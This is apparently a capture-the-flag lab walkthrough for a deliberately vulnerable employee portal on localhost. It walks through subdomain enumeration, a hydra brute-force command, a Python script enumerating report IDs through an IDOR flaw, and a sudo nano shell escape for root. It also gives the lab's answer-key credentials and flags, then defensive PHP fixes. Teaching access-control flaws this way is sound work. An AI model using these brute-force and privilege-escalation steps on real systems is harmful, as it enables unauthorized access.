# MBTI IDOR Lab - Attack Flow Guide

## 🎯 Intended Attack Path

This document outlines the intended exploitation path for the MBTI Employee Portal IDOR vulnerability lab.

---

## Phase 1: Initial Reconnaissance

### Step 1: Landing Page Discovery
1. Navigate to `http://localhost`
2. Explore the Mercedes-Benz Tech Innovation landing page
3. Locate the **"View Default Access Credentials"** link at the bottom (Contact section)
4. Click the link to view the default credentials document

### Step 2: Credential Acquisition
**Found in the credentials document:**
- Default Password: `tekelomuxo`
- Employee ID Format: `MBTI2024XXX`

**Key Information:**
- Password is known: `tekelomuxo`
- Employee ID format is revealed
- Need to find valid Employee ID to login

---

## Phase 2: Subdomain Enumeration

### Step 3: Subdomain Discovery
Use subdomain enumeration tools to discover hidden subdomains:

```bash
# Using ffuf
ffuf -u http://FUZZ.localhost -w /path/to/wordlist.txt -fc 404

# Using gobuster
gobuster vhost -u http://localhost -w /path/to/wordlist.txt

# Manual testing
curl -H "Host: portal.localhost" http://localhost
curl -H "Host: dev.localhost" http://localhost
```

**Expected Findings:**
- `portal.localhost` - Employee Portal (Active)
- `dev.localhost` - Development Environment (Future implementation)

### Step 4: Access Portal Subdomain
Navigate to `http://portal.localhost` and observe the login page.

---

## Phase 3: Employee ID Bruteforce

### Step 5: Analyze Login Form
On `portal.localhost/login.php`:
- Employee ID field expects format: `MBTI2024XXX`
- Password field: Known value `tekelomuxo`
- Need to brute force the XXX portion (numeric)

### Step 6: Brute Force Employee ID
Create a brute force attack to find valid Employee ID:

```bash
# Using hydra
hydra -l MBTI2024^USER^ -p tekelomuxo portal.localhost http-post-form \
  "/login.php:employee_id=^USER^&password=^PASS^:Invalid employee ID or password" \
  -I -t 4 -w 30

# Using custom Python script
for i in range(1, 1000):
    employee_id = f"MBTI2024{str(i).zfill(3)}"
    # Test credentials
```

**Valid Credentials Found:**
- Employee ID: `MBTI2024837`
- Password: `tekelomuxo`
- User: Julia Schneider (Junior Developer)

**Note:** MBTI2024837 is the ONLY account with the default password!

---

## Phase 4: Dashboard Access & Initial Exploration

### Step 7: Successful Login
Login with credentials: `MBTI2024837` / `tekelomuxo`

**Redirect URL:**
```
http://portal.localhost/dashboard.php?page=home&uid=MBTI2024837
```

### Step 8: Dashboard Exploration
Observe the dashboard pages:
- Dashboard (home)
- My Projects
- Tasks
- Timesheet
- Team
- **Reports** ← Primary attack vector
- Profile

**Important:** The `uid` parameter is validated and cannot be manipulated to access other users' dashboards (IDOR protection in place).

---

## Phase 5: IDOR Exploitation

### Step 9: Navigate to Reports Page
Click on "Reports" in the sidebar:

**URL Format:**
```
http://portal.localhost/dashboard.php?page=reports&uid=MBTI2024837&report_id=510
```

**Observe:**
- `report_id` parameter is present
- Report content is displayed
- No apparent authorization check on report access

### Step 10: IDOR Vulnerability Testing
Test the IDOR vulnerability by modifying `report_id`:

```bash
# Test different report IDs
http://portal.localhost/dashboard.php?page=reports&uid=MBTI2024837&report_id=1
http://portal.localhost/dashboard.php?page=reports&uid=MBTI2024837&report_id=100
http://portal.localhost/dashboard.php?page=reports&uid=MBTI2024837&report_id=502
```

### Step 11: Report Enumeration
Enumerate all reports (IDs 1-511):

```python
import requests

session = requests.Session()
# Login first
session.post('http://portal.localhost/login.php', data={
    'employee_id': 'MBTI2024837',
    'password': 'tekelomuxo',
    'login': '1'
})

# Enumerate reports
for report_id in range(1, 512):
    url = f'http://portal.localhost/dashboard.php?page=reports&uid=MBTI2024837&report_id={report_id}'
    response = session.get(url)
    # Parse and save report content
```

### Step 12: Target Report Discovery
**Critical Finding: Report #502**

**Report Details:**
- Title: "Infrastructure Access Credentials"
- Author: Julia Schneider (MBTI2024837)
- Status: CONFIDENTIAL - MANAGER ONLY
- Content: Contains internal infrastructure credentials

**Sensitive Data Exposed:**
```
Development Server: dev.mbti-internal.local
Username: admin
Password: Mb7i_D3v_2024!Secure
```

**Access Rights:**
- Source code repositories
- Database backups
- Customer data (encrypted)
- Internal documentation

---

## Phase 6: CTF Flags (Optional)

### Flag Locations
If attempting the full penetration test:

**User Flag:** `/home/www-data/user.txt`
```
MBTI{3mpl0y33_p0rt4l_4cc3ss_gr4nt3d}
```

**Root Flag:** `/root/root.txt`
```
MBTI{r00t_4cc3ss_m3rc3d3s_b3nz_syst3m}
```

### Privilege Escalation Path (Advanced)
1. Exploit LFI vulnerability (if available)
2. Gain shell access
3. Exploit sudo misconfiguration: `www-data ALL=(ALL) NOPASSWD: /usr/bin/nano`
4. Use GTFOBins nano escape: `sudo nano` → `^R^X` → `reset; sh 1>&0 2>&0`
5. Obtain root access

---

## Summary of Vulnerabilities

### Primary Vulnerability (Intended)
| Vulnerability | Location | Severity | Description |
|--------------|----------|----------|-------------|
| **IDOR on report_id** | `dashboard.php?page=reports&report_id=X` | **Critical** | Access any report without authorization |

### Supporting Vulnerabilities
| Vulnerability | Location | Severity | Status |
|--------------|----------|----------|--------|
| Weak Password Policy | Login | Medium | Default password on one account |
| Information Disclosure | Landing page | Low | Credential document accessible |
| Subdomain Enumeration | Infrastructure | Low | Predictable subdomain names |
| User Enumeration | Login form | Low | Different error messages |

### Removed/Fixed Vulnerabilities
| Vulnerability | Previous Location | Status |
|--------------|-------------------|--------|
| ~~UID-based IDOR~~ | `dashboard.php?uid=X` | **FIXED** - Validation added |
| ~~Weak Passwords (All Users)~~ | Database | **FIXED** - Complex passwords |

---

## Attack Timeline

```
1. Landing Page → Find Default Credentials (5 min)
2. Subdomain Enumeration → Discover portal.localhost (10 min)
3. Employee ID Brute Force → Find MBTI2024837 (15-30 min)
4. Login & Explore Dashboard (5 min)
5. Reports Page → Test report_id IDOR (5 min)
6. Enumerate Reports 1-511 → Find Report #502 (10-20 min)
7. Extract Sensitive Credentials (Complete)
```

**Total Time:** 50-75 minutes (Beginner to Intermediate level)

---

## Defense Recommendations

To remediate the IDOR vulnerability:

1. **Implement Authorization Checks:**
```php
// Check if logged-in user owns the report or is authorized
$stmt = $conn->prepare("SELECT * FROM weekly_reports WHERE id = ? AND employee_id = ?");
$stmt->bind_param("is", $report_id, $_SESSION['employee_id']);
```

2. **Add Role-Based Access Control (RBAC):**
```php
// Managers can view all reports, employees only their own
if ($role !== 'Manager' && $report['employee_id'] !== $_SESSION['employee_id']) {
    die('Unauthorized access');
}
```

3. **Implement Audit Logging:**
```php
// Log all report access attempts
log_access($report_id, $_SESSION['employee_id'], $timestamp);
```

4. **Use Indirect Object References:**
```php
// Use UUIDs or hashed IDs instead of sequential integers
$report_uuid = 'a3f5d9e8-7c2b-4a1f-8e3d-9b7a6c5e4d3f';
```

---

## Learning Objectives Achieved

✅ Understand IDOR vulnerabilities and their impact
✅ Practice parameter manipulation and fuzzing
✅ Learn the difference between authentication and authorization
✅ Understand proper access control implementation
✅ Practice enumeration and information gathering
✅ Learn subdomain discovery techniques
✅ Practice brute force attacks (credential stuffing)

---

**⚠️ IMPORTANT:** This lab is for educational purposes only. Do not use these techniques on systems you don't own or have explicit permission to test.
